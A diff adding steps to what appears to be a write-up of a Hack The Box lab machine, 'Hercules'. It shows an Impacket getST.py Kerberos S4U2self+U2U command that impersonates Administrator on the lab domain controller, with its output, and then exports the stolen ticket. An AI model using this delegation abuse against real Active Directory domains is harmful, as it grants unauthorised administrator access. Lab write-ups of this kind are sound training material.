@@ -1626,6 +1626,24 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Ill then use the NTLM hash and set the session key to the new hash
 
 ```python
+getST.py -u2u -impersonate "Administrator" -spn "cifs/dc.hercules.htb" -k -no-pass 'hercules.htb/iis_webserver$'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
+```
+
+Ill then request the ticket
+
+```python
+export KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
+```
+
+Then export it!
+
+```python
 
 ```
 
